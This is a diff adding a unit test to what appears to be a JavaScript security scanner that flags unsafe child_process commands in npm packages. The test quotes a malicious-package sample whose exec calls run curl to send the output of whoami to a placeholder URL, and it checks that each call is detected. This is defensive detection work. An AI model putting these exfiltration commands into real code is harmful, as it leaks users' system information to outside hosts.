@@ -114,3 +114,24 @@ test("aog-checker detection", () => {
   assert.equal(result.kind, kWarningUnsafeCommand);
   assert.equal(result.value, "uname -a");
 });
+
+test("mydummyproject-zyp detection", () => {
+  // Ref: https://socket.dev/npm/package/mydummyproject-zyp/files/99.9.9/index.js
+  const maliciousCode = `
+    require('child_process').exec('ping -c 4 <URL>');
+    require('child_process').exec(\`curl -X POST -d "$(whoami)" <URL>/c\`);
+    require('child_process').exec(\`curl "<URL>/c?user=$(whoami)"\`);
+  `;
+
+  const ast = parseScript(maliciousCode);
+  const sastAnalysis = getSastAnalysis(maliciousCode, isUnsafeCommand)
+    .execute(ast.body);
+
+  const result = sastAnalysis.warnings();
+  assert.equal(result.at(0).kind, kWarningUnsafeCommand);
+  assert.equal(result.at(0).value, "ping -c 4 <URL>");
+  assert.equal(result.at(1).kind, kWarningUnsafeCommand);
+  assert.equal(result.at(1).value, "curl -X POST -d \"$(whoami)\" <URL>/c");
+  assert.equal(result.at(2).kind, kWarningUnsafeCommand);
+  assert.equal(result.at(2).value, "curl \"<URL>/c?user=$(whoami)\"");
+});
